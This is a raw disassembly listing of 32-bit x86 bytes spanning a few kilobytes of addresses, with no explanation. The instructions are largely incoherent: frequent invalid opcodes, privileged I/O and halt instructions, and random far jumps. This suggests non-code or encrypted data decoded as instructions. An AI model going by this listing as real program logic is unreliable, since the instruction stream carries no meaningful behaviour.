  4268d1:	stos   BYTE PTR es:[edi],al
  4268d2:	aaa    
  4268d3:	jmp    0x2f4:0x8715dfae
  4268da:	xor    ecx,DWORD PTR [esi]
  4268dc:	mov    edx,DWORD PTR [edi+0x22cf2eb7]
  4268e2:	imul   ecx,DWORD PTR [ecx],0x5557ee5f
  4268e8:	int    0x72
  4268ea:	dec    edi
  4268eb:	mov    esp,0x81d75ae4
  4268f0:	adc    BYTE PTR [edx+0x2e],al
  4268f3:	scas   al,BYTE PTR es:[edi]
  4268f4:	pop    edi
  4268f5:	sub    ebx,DWORD PTR [ecx-0x459a312b]
  4268fb:	popf   
  4268fc:	pop    ss
  4268fd:	and    edi,edx
  4268ff:	jbe    0x4268e3
  426901:	push   ebx
  426902:	mov    eax,DWORD PTR [esi]
  426904:	add    al,0xf3
  426906:	inc    ebp
  426907:	sahf   
  426908:	hlt    
  426909:	xchg   DWORD PTR [edx],ebp
  42690b:	mov    eax,0xa297cdef
  426910:	pop    edx
  426911:	loop   0x4268aa
  426913:	mov    al,0x66
  426915:	iret   
  426916:	(bad)  
  426917:	dec    ebx
  426918:	adc    BYTE PTR [ecx-0x3054207e],cl
  42691e:	mov    ds:0x8aa156fb,al
  426923:	mov    ds:0x1e0c614a,eax
  426928:	push   es
  426929:	icebp  
  42692a:	cmp    bl,BYTE PTR cs:[esi+0x59]
  42692e:	cmp    ecx,esi
  426930:	outs   dx,BYTE PTR ds:[esi]
  426931:	stos   BYTE PTR es:[edi],al
  426932:	cmp    al,0xbb
  426934:	push   ebx
  426935:	lock pusha 
  426937:	nop
  426938:	fadd   QWORD PTR [esi-0x58]
  42693b:	jb     0x42698b
  42693d:	and    DWORD PTR [ebx+0x6800ac],ebx
	...
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	push   ds
  4269c1:	and    eax,0x9b2a3101
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	test   BYTE PTR [eax],0x0
  4269cb:	add    BYTE PTR [edi+0x10e14514],cl
  4269d1:	mov    ebp,0xf0da7467
  4269d6:	push   cs
  4269d7:	loopne 0x4269da
  4269d9:	stos   DWORD PTR es:[edi],eax
  4269da:	xchg   ecx,eax
  4269db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269dc:	lods   al,BYTE PTR ds:[esi]
  4269dd:	mov    dl,0x0
  4269df:	mov    WORD PTR [eax],cs
  4269e1:	sbb    ah,ch
  4269e3:	out    dx,eax
  4269e4:	ret    
  4269e5:	adc    eax,0xe259845a
  4269ea:	loopne 0x42699a
  4269ec:	mov    edi,0x5d9a1170
  4269f1:	sahf   
  4269f2:	ror    BYTE PTR [ecx-0x22],cl
  4269f5:	and    al,0x75
  4269f7:	xchg   ebp,eax
  4269f8:	cmp    al,0x11
  4269fa:	or     DWORD PTR [ebx],0xfffffff4
  4269fd:	push   ebp
  4269fe:	adc    eax,DWORD PTR [eax-0x66a79e44]
  426a04:	inc    edx
  426a05:	bound  ebp,QWORD PTR [esi]
  426a07:	xor    BYTE PTR [eiz*8+0x33698c6e],0x79
  426a0f:	jmp    DWORD PTR ds:0x89ef4ee
  426a15:	xlat   BYTE PTR ds:[ebx]
  426a16:	test   al,0xbc
  426a18:	adc    eax,0xc942f762
  426a1d:	xchg   BYTE PTR [edi+0x746fd538],al
  426a23:	sub    BYTE PTR [esi+0x1d],dl
  426a26:	shl    ebp,1
  426a28:	ss popf 
  426a2a:	inc    BYTE PTR [ecx+ebx*1]
  426a2d:	bound  edi,QWORD PTR [eax+0x69]
  426a30:	xchg   DWORD PTR [ebp-0x79],edx
  426a33:	sub    ebx,ecx
  426a35:	mov    al,0xbd
  426a37:	mov    cl,0x78
  426a39:	clc    
  426a3a:	and    DWORD PTR [edx],0xffffffff
  426a3d:	scas   al,BYTE PTR es:[edi]
  426a3e:	dec    edx
  426a3f:	sbb    al,0xb2
  426a41:	stos   BYTE PTR es:[edi],al
  426a42:	push   0xffffffb6
  426a44:	cmp    edi,DWORD PTR [eax+edx*2]
  426a47:	test   al,0xa
  426a49:	mov    BYTE PTR [ebx],ah
  426a4b:	push   esp
  426a4c:	push   eax
  426a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a4e:	in     eax,0x20
  426a50:	pop    ss
  426a51:	and    eax,0x9d292226
  426a56:	sub    al,0x17
  426a58:	push   ebp
  426a59:	fwait
  426a5a:	and    al,0xd3
  426a5c:	rcl    ebp,0xcc
  426a5f:	es lahf 
  426a61:	adc    ch,dh
  426a63:	mov    ebx,0x53a78905
  426a68:	or     eax,0xa5be8f43
  426a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a6e:	aad    0x89
  426a70:	push   cs
  426a71:	into   
  426a72:	lods   eax,DWORD PTR ds:[esi]
  426a73:	pop    ss
  426a74:	dec    ecx
  426a75:	mov    WORD PTR [ecx+eiz*8-0x20],cs
  426a79:	std    
  426a7a:	and    cl,BYTE PTR [eax]
  426a7c:	call   0x69c9:0xa4579231
  426a83:	neg    BYTE PTR [esi+ebp*2-0x28]
  426a87:	mov    esp,0xaef24a9a
  426a8c:	add    ebp,DWORD PTR [esi+0x72]
  426a8f:	ret    
  426a90:	fwait
  426a91:	aaa    
  426a92:	sti    
  426a93:	dec    edx
  426a94:	in     eax,dx
  426a95:	sub    BYTE PTR [ecx+0x61],al
  426a98:	jns    0x426a5c
  426a9a:	fs inc esp
  426a9c:	inc    ebp
  426a9d:	push   ss
  426a9e:	push   edx
  426a9f:	out    dx,al
  426aa0:	gs jns 0x426a52
  426aa3:	mov    WORD PTR [ebp+0x33813624],fs
  426aa9:	push   cs
  426aaa:	push   0xffffff8b
  426aac:	outs   dx,DWORD PTR ds:[esi]
  426aad:	mov    DWORD PTR [eax-0x72],esi
  426ab0:	xchg   BYTE PTR [edx+0x9],cl
  426ab3:	push   esi
  426ab4:	xchg   ebx,eax
  426ab5:	sbb    eax,0xedba305d
  426aba:	or     ch,BYTE PTR [esi+0x6c1311b8]
  426ac0:	or     BYTE PTR [ecx],ah
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	mov    esi,0x20c23d1b
  426b45:	pushf  
  426b46:	add    DWORD PTR [eax],eax
  426b48:	test   BYTE PTR [eax],0x0
  426b4b:	add    ah,dh
  426b4d:	xchg   BYTE PTR [esi+0x4e],bl
  426b50:	xor    eax,0x7b65d680
  426b55:	sbb    al,0x18
  426b57:	loope  0x426b0f
  426b59:	loop   0x426af7
  426b5b:	dec    eax
  426b5c:	ins    BYTE PTR es:[edi],dx
  426b5d:	dec    eax
  426b5e:	push   esi
  426b5f:	ins    DWORD PTR es:[edi],dx
  426b60:	mov    al,ds:0xffbafa6f
  426b65:	or     eax,0x35c5e7a1
  426b6a:	out    0xe8,al
  426b6c:	add    ch,BYTE PTR [edi+esi*4-0x16e4011f]
  426b73:	add    DWORD PTR [eax+0x5303668a],0xa8e47319
  426b7d:	xlat   BYTE PTR ds:[ebx]
  426b7e:	sbb    edx,DWORD PTR [esi]
  426b80:	and    eax,0xec032dc
  426b85:	shr    DWORD PTR [edi],cl
  426b87:	shr    BYTE PTR [ebx],cl
  426b89:	in     al,dx
  426b8a:	shl    DWORD PTR [eax],1
  426b8c:	fwait
  426b8d:	mov    dh,0xb7
  426b90:	retf   0xd254
  426b93:	mov    ch,0xf4
  426b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b96:	mov    edx,0x131b269c
  426b9b:	stc    
  426b9c:	sub    al,0xcf
  426b9e:	push   ds
  426b9f:	out    0xdd,al
  426ba1:	data16 test al,0xbe
  426ba4:	sbb    al,0x27
  426ba6:	pop    ss
  426ba7:	pop    esp
  426ba8:	mov    BYTE PTR ds:0x72c051ad,dh
  426bae:	and    eax,0xa7527ec8
  426bb3:	inc    esi
  426bb4:	fwait
  426bb5:	sub    al,0x9b
  426bb7:	aam    0xb6
  426bb9:	adc    BYTE PTR [esi-0x21],0xc0
  426bbd:	pslld  mm1,QWORD PTR [ecx]
  426bc0:	popa   
  426bc1:	push   edx
  426bc2:	pop    ss
  426bc3:	xchg   ebp,eax
  426bc4:	aad    0xbc
  426bc6:	push   ss
  426bc7:	jl     0x426c0f
  426bc9:	scas   al,BYTE PTR es:[edi]
  426bca:	hlt    
  426bcb:	in     al,dx
  426bcc:	sahf   
  426bcd:	jmp    0x426bca
  426bcf:	sub    ebx,ebp
  426bd1:	adc    ebp,DWORD PTR [edx]
  426bd3:	xchg   DWORD PTR [edx-0x7c],esp
  426bd6:	pop    ecx
  426bd7:	and    al,0xf7
  426bd9:	push   edi
  426bda:	cli    
  426bdb:	lds    ebp,FWORD PTR [edx]
  426bdd:	add    BYTE PTR [ecx-0x5b41ee74],ah
  426be3:	in     al,0xc0
  426be5:	cli    
  426be6:	cdq    
  426be7:	dec    eax
  426be8:	sar    BYTE PTR [eax+0x4d28c568],cl
  426bee:	sbb    eax,0xc7ad5760
  426bf3:	or     BYTE PTR [edi-0x72],ch
  426bf6:	push   ebp
  426bf7:	daa    
  426bf8:	cmp    DWORD PTR [edi+0x4c617d37],ebx
  426bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bff:	add    edx,DWORD PTR [esi]
  426c01:	js     0x426c0a
  426c03:	out    dx,eax
  426c04:	cwde   
  426c05:	cli    
  426c06:	mov    DWORD PTR [edi],edi
  426c08:	retf   0xc81e
  426c0b:	retf   
  426c0c:	mov    BYTE PTR [edi+0x9],cl
  426c0f:	and    DWORD PTR [eax+0x10],esp
  426c12:	fadd   DWORD PTR [ebx]
  426c14:	or     ah,BYTE PTR [ebx-0x5a29ee69]
  426c1a:	pop    ds
  426c1b:	lahf   
  426c1c:	(bad)  
  426c1f:	repz dec eax
  426c21:	push   es
  426c22:	test   DWORD PTR es:[edx],ebx
  426c25:	push   eax
  426c26:	aam    0x87
  426c28:	les    ebx,FWORD PTR [edx]
  426c2a:	fadd   DWORD PTR [ebx+edi*2-0x2e96dad]
  426c31:	pop    edi
  426c32:	pushf  
  426c33:	mov    esp,0xe3bb05c9
  426c38:	sahf   
  426c39:	xlat   BYTE PTR ds:[ebx]
  426c3a:	xchg   DWORD PTR [eax-0x3],esi
  426c3d:	mov    eax,ds:0x920b5010
	...
  426cb2:	add    BYTE PTR [eax],al
  426cb4:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	retf   0xcb1e
  426cc3:	jmp    0xf6:0x19d16
  426cca:	add    BYTE PTR [eax],al
  426ccc:	ss pop es
  426cce:	shl    DWORD PTR [ecx],0xe9
  426cd1:	jl     0x426d1c
  426cd3:	sahf   
  426cd4:	pop    ds
  426cd5:	mov    BYTE PTR [edx-0x3b213f28],bl
  426cdb:	mov    ecx,0x3035390e
  426ce0:	mov    BYTE PTR [esi],cl
  426ce2:	xchg   edi,eax
  426ce3:	(bad)  
  426ce4:	lea    eax,[esi]
  426ce6:	ret    
  426ce7:	mov    edi,0xdead295f
  426cec:	fnsave [ecx+0x16499e28]
  426cf2:	jmp    0xb70d:0x14bb40fc
  426cf9:	sub    DWORD PTR [ecx+0x3],esp
  426cfc:	mov    ah,0xe6
  426cfe:	xor    dl,BYTE PTR [ecx+0x552004f]
  426d04:	xor    al,0xa6
  426d06:	inc    ebp
  426d07:	push   esp
  426d08:	nop
  426d09:	in     eax,0x14
  426d0b:	fnsave [eax-0x10]
  426d0e:	test   eax,0x4262defa
  426d13:	out    dx,al
  426d14:	ret    
  426d15:	inc    esp
  426d16:	(bad)  
  426d18:	test   ah,bl
  426d1a:	pop    esi
  426d1b:	lods   al,BYTE PTR ds:[esi]
  426d1c:	and    eax,0xd54b840f
  426d21:	out    dx,eax
  426d22:	es pop ds
  426d24:	les    esi,FWORD PTR [esi]
  426d26:	jl     0x426da5
  426d28:	out    0x98,eax
  426d2a:	stos   BYTE PTR es:[edi],al
  426d2b:	dec    ebx
  426d2c:	xor    al,0xd5
  426d2e:	ret    
  426d2f:	fwait
  426d30:	rcl    eax,cl
  426d32:	lahf   
  426d33:	ss pop ecx
  426d35:	les    ebx,FWORD PTR [esi-0x2d]
  426d38:	cmp    ah,dh
  426d3a:	cmp    BYTE PTR [edi],bl
  426d3c:	inc    esi
  426d3d:	fmul   DWORD PTR [edx+0x2d]
  426d40:	jo     0x426dac
  426d42:	pusha  
  426d43:	sub    al,BYTE PTR [esi-0x4d694f03]
  426d49:	retf   
  426d4a:	sahf   
  426d4b:	hlt    
  426d4c:	iret   
  426d4d:	jno    0x426d53
  426d4f:	sub    eax,0x43989411
  426d54:	push   esp
  426d55:	mov    bl,0x1b
  426d57:	pop    ebx
  426d58:	lea    ebx,[edi]
  426d5a:	mov    al,0x3f
  426d5c:	cmp    al,0x58
  426d5e:	dec    eax
  426d5f:	add    DWORD PTR [esi],ebp
  426d61:	jnp    0x426cef
  426d63:	mov    WORD PTR [eax+0x5a],?
  426d66:	mov    ecx,0x19893e6
  426d6b:	(bad)  
  426d6c:	jns    0x426d95
  426d6e:	mov    bh,0x60
  426d70:	sar    BYTE PTR [edi-0x44b2a848],0xc0
  426d77:	fsub   QWORD PTR [eax-0x40a9d07]
  426d7d:	imul   esi,ebx,0xffffffa4
  426d80:	ja     0x426d5f
  426d82:	push   ebx
  426d83:	push   ebp
  426d84:	gs pop edi
  426d86:	or     DWORD PTR [edx+eax*1-0x4b15612d],esi
  426d8d:	mov    al,0x2b
  426d8f:	aam    0x17
  426d91:	push   ebx
  426d92:	add    dh,BYTE PTR [esi+ebp*2]
  426d95:	not    BYTE PTR [esi]
  426d97:	fldenv [edi+eiz*2]
  426d9a:	bound  esi,QWORD PTR [edi+0x59b18403]
  426da0:	enter  0x2cb8,0x74
  426da4:	in     eax,0x45
  426da6:	xchg   esi,eax
  426da7:	mov    edi,0xd6ca200d
  426dac:	xchg   edi,eax
  426dad:	cmp    eax,0x65085cbe
  426db2:	hlt    
  426db3:	fcomp  DWORD PTR [ecx*4-0x7020f60c]
  426dba:	addr16 daa 
  426dbc:	xchg   esi,eax
  426dbd:	dec    edi
  426dbe:	mov    DWORD PTR [ebx-0x75],0x7
	...
  426e31:	add    BYTE PTR [eax],al
  426e33:	add    dh,al
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	jmp    0xd0079c2
  426e45:	sahf   
  426e46:	add    DWORD PTR [eax],eax
  426e48:	test   BYTE PTR [eax],0x0
  426e4b:	add    cl,bl
  426e4d:	shl    esi,cl
  426e4f:	add    BYTE PTR [esi],cl
  426e51:	mov    esi,0x69f82fa7
  426e56:	mov    edi,esp
  426e58:	pop    ebp
  426e59:	popf   
  426e5a:	ins    BYTE PTR es:[edi],dx
  426e5b:	mov    bl,0x4a
  426e5d:	repnz dec ecx
  426e5f:	dec    edx
  426e60:	call   0xadd04a44
  426e65:	inc    esp
  426e66:	ds call 0x57199f75
  426e6c:	inc    edi
  426e6d:	pop    ds
  426e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e6f:	mov    bh,BYTE PTR [esi+eiz*1-0x42cc51cc]
  426e76:	jmp    0x39a9:0xf2a37020
  426e7d:	xchg   dh,al
  426e7f:	outs   dx,DWORD PTR ds:[esi]
  426e80:	sahf   
  426e81:	outs   dx,BYTE PTR ds:[esi]
  426e82:	inc    esi
  426e83:	and    BYTE PTR [edx-0x5b],bl
  426e86:	mov    ecx,0x3f595708
  426e8b:	mov    eax,0x6399b153
  426e90:	repnz pop ebx
  426e92:	inc    esp
  426e93:	inc    ebx
  426e94:	sar    ebx,cl
  426e96:	xor    eax,0x7aea8f69
  426e9b:	ja     0x426e43
  426e9d:	leave  
  426e9e:	add    DWORD PTR [ebp-0x6bf2d4fe],ecx
  426ea4:	jmp    0x68e7b418
  426ea9:	repnz or dh,BYTE PTR [edx+0x66]
  426ead:	mov    bl,0x45
  426eaf:	fisttp WORD PTR [edi+edi*1+0x66]
  426eb3:	adc    BYTE PTR [ecx+esi*1+0x6ccdf5ae],al
  426eba:	jns    0x426ed6
  426ebc:	popf   
  426ebd:	out    dx,al
  426ebe:	mov    ah,0x7d
  426ec0:	pop    ebp
  426ec1:	pop    ebx
  426ec2:	cli    
  426ec3:	lods   al,BYTE PTR ds:[esi]
  426ec4:	jne    0x426f2f
  426ec6:	add    al,0x62
  426ec8:	xor    ebx,DWORD PTR [ecx-0x1]
  426ecb:	inc    ebp
  426ecc:	rcr    ecx,0x80
  426ecf:	jecxz  0x426e8b
  426ed1:	ret    
  426ed2:	xor    BYTE PTR [esi-0x1e],cl
  426ed5:	iret   
  426ed6:	je     0x426efc
  426ed8:	mov    eax,0xc30e12aa
  426edd:	mov    ds:0xd90b72f6,al
  426ee2:	pop    ebp
  426ee3:	dec    ebp
  426ee4:	dec    ecx
  426ee5:	out    dx,eax
  426ee6:	rcl    BYTE PTR [ebp+0x15],1
  426ee9:	shl    BYTE PTR [edx],0x4e
  426eec:	jns    0x426e76
  426eee:	jb     0x426ef6
  426ef0:	or     ch,BYTE PTR [eax]
  426ef2:	sahf   
  426ef3:	ins    BYTE PTR es:[edi],dx
  426ef4:	inc    ebp
  426ef5:	int3   
  426ef6:	idiv   BYTE PTR [ebx-0x41]
  426ef9:	jmp    0x8514:0xf4479f74
  426f00:	mov    es,WORD PTR [edx-0x59]
  426f03:	bound  ecx,QWORD PTR ds:0x92175201
  426f09:	dec    edi
  426f0a:	sbb    eax,0x9d955a55
  426f0f:	out    0xae,eax
  426f11:	icebp  
  426f12:	fwait
  426f13:	sub    ebx,0x29
  426f16:	adc    DWORD PTR cs:[eax-0x7e],eax
  426f1a:	in     eax,0x67
  426f1c:	mov    ch,0x88
  426f1e:	and    eax,0xd67f5c37
  426f23:	(bad)  
  426f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f25:	pop    eax
  426f26:	pop    ecx
  426f27:	inc    edi
  426f28:	(bad)  
  426f29:	sbb    al,0xba
  426f2b:	xlat   BYTE PTR ds:[ebx]
  426f2c:	jne    0x426f00
  426f2e:	aas    
  426f2f:	sbb    al,0x32
  426f31:	mov    dh,0x8d
  426f33:	cld    
  426f34:	pop    ss
  426f35:	add    al,0xf4
  426f37:	(bad)  
  426f38:	push   esi
  426f39:	push   ds
  426f3a:	sbb    bl,ah
  426f3c:	call   0x85:0xc3d5c94c
	...
  426fb3:	add    BYTE PTR [ecx],bh
  426fb5:	cwde   
  426fb6:	or     eax,DWORD PTR [esi]
  426fb8:	stos   DWORD PTR es:[edi],eax
  426fb9:	xchg   edi,eax
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	mov    ecx,0x2f0fda1
  426fc5:	lahf   
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	test   BYTE PTR [eax],0x0
  426fcb:	add    BYTE PTR [edx+0x4e],dl
  426fce:	mov    ds:0x17274fc5,eax
  426fd3:	sub    al,0x37
  426fd5:	pushf  
  426fd6:	lock inc edi
  426fd8:	sar    BYTE PTR [ebx],0xf2
  426fdb:	dec    esp
  426fdc:	jmp    0x42705a
  426fde:	sub    cl,BYTE PTR [edx-0x6]
  426fe1:	imul   edi,DWORD PTR [esi-0x14],0x18158cb2
  426fe8:	jmp    DWORD PTR [ebx*2-0x303400e6]
  426fef:	inc    ebp
  426ff0:	dec    ecx
  426ff1:	loope  0x426f87
  426ff3:	mov    ds:0x72faf6ec,eax
  426ff8:	dec    ecx
  426ff9:	hlt    
  426ffa:	mov    ebp,0x37cba33c
  426fff:	fs loope 0x426ff8
  427002:	rol    BYTE PTR [eax],0x3e
  427005:	(bad)  
  427006:	stos   BYTE PTR es:[edi],al
  427007:	pop    ss
  427008:	mov    bh,0xd0
  42700a:	lds    ecx,FWORD PTR [edx]
  42700c:	sub    DWORD PTR [ecx+0x2b],0x7876e86d
  427013:	sbb    edi,edx
  427015:	(bad)  
  427016:	bound  eax,QWORD PTR [ebx]
  427018:	js     0x427066
  42701a:	dec    eax
  42701b:	xchg   ebp,ecx
  42701d:	add    edi,DWORD PTR [edi-0x77]
  427020:	outs   dx,BYTE PTR ds:[esi]
  427021:	sbb    BYTE PTR [edx+0x84332aa],0xa0
  427028:	add    al,0x6b
  42702a:	mov    ds:0x4254ba45,eax
  42702f:	(bad)  
  427031:	dec    eax
  427032:	rcr    BYTE PTR [ebx],1
  427034:	pop    ss
  427035:	je     0x42702a
  427037:	push   ds
  427038:	pop    ds
  427039:	inc    esi
  42703a:	ja     0x42706e
  42703c:	jo     0x426feb
  42703e:	pusha  
  42703f:	or     eax,0xc4d98c2e
  427044:	lds    esi,FWORD PTR [ebp-0x6e504c98]
  42704a:	stos   BYTE PTR es:[edi],al
  42704b:	fdiv   st(2),st
  42704d:	or     al,0x53
  42704f:	pop    edx
  427050:	stc    
  427051:	cli    
  427052:	xchg   DWORD PTR [edx+0x73c4ab10],eax
  427058:	(bad)  
  427059:	out    0xe,al
  42705b:	adc    al,0xeb
  42705d:	mov    ebp,0x3d72c6ba
  427062:	jbe    0x42704f
  427064:	stc    
  427065:	pop    esi
  427066:	out    0x57,eax
  427068:	dec    esi
  427069:	mov    ebx,DWORD PTR [esp+ebp*2]
  42706c:	rcl    BYTE PTR [esi],1
  42706e:	aam    0x54
  427070:	dec    ecx
  427071:	lock dec edi
  427073:	cs pop es
  427075:	rcr    BYTE PTR [edx],0xbf
  427078:	inc    edx
  427079:	stos   DWORD PTR es:[edi],eax
  42707a:	leave  
  42707b:	cmp    BYTE PTR [esi+0x1ac4b032],bl
  427081:	imul   esp,DWORD PTR [edx+0x65530e67],0x97fd81f3
  42708b:	aam    0xab
  42708d:	leave  
  42708e:	rcr    BYTE PTR [eax],1
  427090:	mov    WORD PTR [ecx-0x3e],gs
  427093:	or     eax,0xc4769a29
  427098:	or     al,0xe
  42709a:	(bad)  
  42709c:	xor    DWORD PTR [esi-0xd],ebp
  42709f:	enter  0x504b,0xf7
  4270a3:	and    bh,BYTE PTR [edi-0xa]
  4270a6:	dec    esi
  4270a7:	pop    edi
  4270a8:	jge    0x4270bc
  4270aa:	mov    edx,0x89ae4265
  4270af:	jmp    0xf696:0x696dbd70
  4270b6:	int    0x1e
  4270b8:	dec    ebx
  4270b9:	les    eax,FWORD PTR [esp+esi*2-0x6906968e]
  4270c0:	push   edi
  4270c1:	dec    edx
	...
  427132:	add    BYTE PTR [eax],al
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0x2
  427141:	mov    eax,ds:0x9ff87a03
  427146:	add    DWORD PTR [eax],eax
  427148:	test   BYTE PTR [eax],0x0
  42714b:	add    BYTE PTR ds:0x17573d53,ah
  427151:	adc    ebx,DWORD PTR [esi]
  427153:	cmp    eax,0x6dbb4e39
  427158:	inc    edx
  427159:	xor    eax,0x33046be2
  42715e:	sti    
  42715f:	ficomp WORD PTR [eax+0xd]
  427162:	mov    esi,DWORD PTR [eax]
  427164:	sbb    eax,0x47536fde
  427169:	in     al,dx
  42716a:	cmc    
  42716b:	fisubr DWORD PTR [eax-0x5c]
  42716e:	rol    BYTE PTR es:[ebx],0x46
  427172:	add    bl,BYTE PTR [eax+edx*2]
  427175:	jns    0x4271f2
  427177:	pushf  
  427178:	push   eax
  427179:	loop   0x4270fd
  42717b:	cmp    BYTE PTR [ecx+0x322aadb8],al
  427181:	nop
  427182:	cwde   
  427183:	into   
  427184:	or     DWORD PTR [ebx+ecx*2+0x73950a3d],esi
  42718b:	adc    eax,DWORD PTR [ebp-0x6a]
  42718e:	cmp    al,0x52
  427190:	retf   0xbc65
  427193:	sub    ebp,0x2b39d79f
  427199:	cli    
  42719a:	add    eax,0xc293cdcb
  42719f:	fdivr  QWORD PTR [ebx-0x53]
  4271a2:	addr16 stc 
  4271a4:	fst    QWORD PTR [ebp+0x24]
  4271a7:	arpl   WORD PTR [eax+edx*4],ax
  4271aa:	push   es
  4271ab:	shl    ecx,cl
  4271ad:	mov    dh,BYTE PTR ds:0x6c318a90
  4271b3:	jmp    FWORD PTR [ebx]
  4271b5:	in     al,0x38
  4271b7:	dec    esp
  4271b8:	push   ebx
  4271b9:	ror    DWORD PTR [edx-0x45],0xa4
  4271bd:	scas   eax,DWORD PTR es:[edi]
  4271be:	xor    ah,BYTE PTR [edi-0x41f2b8ad]
  4271c4:	adc    bh,al
  4271c6:	int3   
  4271c7:	jg     0x4271bd
  4271c9:	sbb    eax,0xb11934b6
  4271ce:	ja     0x4271d4
  4271d0:	push   0x775ffda2
  4271d5:	es push 0x8e7bb761
  4271db:	jns    0x4271d3
  4271dd:	xchg   esi,eax
  4271de:	mov    ah,0x3e
  4271e0:	dec    eax
  4271e1:	mov    BYTE PTR [ebp+0x68],bl
  4271e4:	adc    al,0x9e
  4271e6:	iret   
  4271e7:	popa   
  4271e8:	xchg   ah,dh
  4271ea:	scas   al,BYTE PTR es:[edi]
  4271eb:	mov    ah,0x51
  4271ed:	mov    esi,0x65c5d54c
  4271f2:	xor    esi,DWORD PTR [ecx-0x63]
  4271f5:	sar    BYTE PTR [esi-0x267da075],0x6e
  4271fc:	je     0x42727b
  4271fe:	hlt    
  4271ff:	mov    bl,BYTE PTR [edx+0x1464a1f7]
  427205:	push   ebx
  427206:	sbb    al,0xad
  427208:	test   dh,0xed
  42720b:	stc    
  42720c:	jae    0x4271a1
  42720e:	inc    ecx
  42720f:	fimul  DWORD PTR [eax-0x69]
  427212:	ins    BYTE PTR es:[edi],dx
  427213:	popa   
  427214:	jle    0x427291
  427216:	push   edi
  427217:	ins    DWORD PTR es:[edi],dx
  427218:	pop    ebp
  427219:	fwait
  42721a:	cs out 0x89,al
  42721d:	repnz test BYTE PTR [ebp-0x7],al
  427221:	xchg   ecx,eax
  427222:	mov    dh,0x0
  427224:	add    al,0x8c
  427226:	stos   DWORD PTR es:[edi],eax
  427227:	fisttp DWORD PTR [ebx-0x66]
  42722a:	push   edx
  42722b:	es jns 0x427264
  42722e:	paddd  mm6,QWORD PTR ds:0x7a652b9a
  427235:	jmp    0x6397:0x3399488f
  42723c:	call   0xbe3ab7fe
  427241:	mov    ds:0x0,al
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0xa944e9e9
  4272c4:	out    dx,al
  4272c5:	mov    al,ds:0xf60001
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	in     eax,dx
  4272cd:	aaa    
  4272ce:	add    DWORD PTR [edx+0x45ffa74a],ebx
  4272d4:	xchg   esp,eax
  4272d5:	stc    
  4272d6:	(bad)  
  4272d7:	fstp   TBYTE PTR [edx]
  4272d9:	test   BYTE PTR [esi+ebp*4],0xd2
  4272dd:	add    DWORD PTR [edx],0xf
  4272e0:	pop    ebx
  4272e1:	jbe    0x427347
  4272e3:	mov    ebp,0xf2dc2733
  4272e8:	pop    ss
  4272e9:	dec    edi
  4272ea:	add    edi,eax
  4272ec:	fucomi st,st(4)
  4272ee:	lock fwait
  4272f0:	les    ebx,FWORD PTR [eax]
  4272f2:	mov    ch,0x4f
  4272f4:	xchg   BYTE PTR [ebx+0xd],al
  4272f7:	repz das 
  4272f9:	mov    bl,0x2a
  4272fb:	std    
  4272fc:	jne    0x427350
  4272fe:	sbb    al,0x9c
  427300:	ins    WORD PTR es:[edi],dx
  427302:	sub    al,0xed
  427304:	mov    bh,0xc0
  427306:	mov    DWORD PTR [ecx],ebp
  427308:	sbb    al,0xf
  42730a:	inc    ecx
  42730b:	xor    cl,BYTE PTR [edi-0x4d]
  42730e:	jae    0x427315
  427310:	or     BYTE PTR [eax-0x24434ccf],ch
  427316:	test   BYTE PTR [edi],dl
  427318:	jl     0x427398
  42731a:	fs dec eax
  42731c:	mov    cl,BYTE PTR [ecx]
  42731e:	retf   0x49e2
  427321:	push   esp
  427322:	jp     0x427323
  427324:	pop    edx
  427325:	mov    ebp,0x5e32ba49
  42732a:	cwde   
  42732b:	fistp  QWORD PTR [ecx-0x52]
  42732e:	clc    
  42732f:	sbb    al,0x29
  427331:	pop    ss
  427332:	in     eax,0x26
  427334:	jne    0x4272e7
  427336:	xor    bh,BYTE PTR [eax+0x738b24e3]
  42733c:	loopne 0x42739c
  42733e:	fwait
  42733f:	sub    al,0x6e
  427341:	lods   al,BYTE PTR ds:[esi]
  427342:	fwait
  427343:	push   ds
  427344:	dec    esp
  427345:	cmp    al,0x6a
  427347:	push   esp
  427348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427349:	mov    edx,0xfc1b153a
  42734e:	shl    BYTE PTR [ebx],0xe3
  427351:	inc    edx
  427352:	and    eax,0x1613de2c
  427357:	pop    ss
  427358:	sar    BYTE PTR [esi],0x21
  42735b:	inc    esp
  42735c:	mov    al,0x38
  42735e:	dec    edx
  42735f:	pushf  
  427360:	ds xor bh,ah
  427363:	inc    edi
  427364:	(bad)  
  427365:	imul   esi,edi,0x259c280
